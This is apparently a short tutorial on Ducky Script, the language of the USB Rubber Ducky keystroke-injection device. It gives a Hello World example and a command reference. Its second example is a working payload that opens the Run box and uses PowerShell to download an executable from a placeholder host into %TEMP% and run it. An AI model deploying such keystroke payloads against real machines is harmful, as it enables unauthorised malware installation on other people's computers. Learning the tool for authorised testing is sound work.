# Introduction #
Since first time Ducky users are unfamiliar with Ducky Script, below is a brief summary (with examples) on how to code in Ducky Script.

# Example 1 - Hello World #
The Ducky fires the payload immediately, so you need an initial delay for the OS to recognize and allow the Ducky to proceed as a keyboard, in this example we use a delay of 3secs (3000msecs) for the Windows OS (other OS's may be quicker).

The steps of this example can be broken down into:
  * Initial Delay for the OS
  * GUI R triggers the run-box
  * Small delay to wait for the run-box to open
  * Ducky types notepad ENTER to load notepad
  * Small delay to wait for notepad to open
  * Ducky then types an arbitrary string into notepad

```
DELAY 3000
GUI R
DELAY 200
STRING notepad
ENTER
DELAY 200
STRING Hello World!!!
ENTER
```

# Example 2 - Download & Execute #
An example of using Powershell to download a file from the web and then execute it.
```
DELAY 3000
GUI r
DELAY 100
STRING powershell (new-object System.Net.WebClient).DownloadFile('http://example.com/bob.old','%TEMP%\bob.exe');
DELAY 100
STRING Start-Process "%TEMP%\bob.exe"
ENTER
```
# Other Examples #
The community is storing generated payloads on the following wiki-page:
  * https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads

# Command Breakdown #
  * DELAY _x msecs_ - Delay in milli-secs
  * STRING _xyz_ - types following characters
  * GUI - Windows Menu Key
  * GUI R - Windows Run box
  * Command - OSX Command Key
  * UP | UPARROW - Up Key
  * DOWN | DOWNARROW - Down Key
  * LEFT | LEFTARROW - Left Key
  * RIGHT | RIGHTARROW - Right Key
  * CAPS |CAPSLOCK - Capslock Key
  * ENTER - Return/Enter key
  * SPACE - Spacebar
  * REPEAT _x_ - Repeat previous command X times.
You can even use some (but not all) two or three key-combinations:
  * SHIFT-ENTER
  * CTRL-ALT-DEL
  * ALT-F4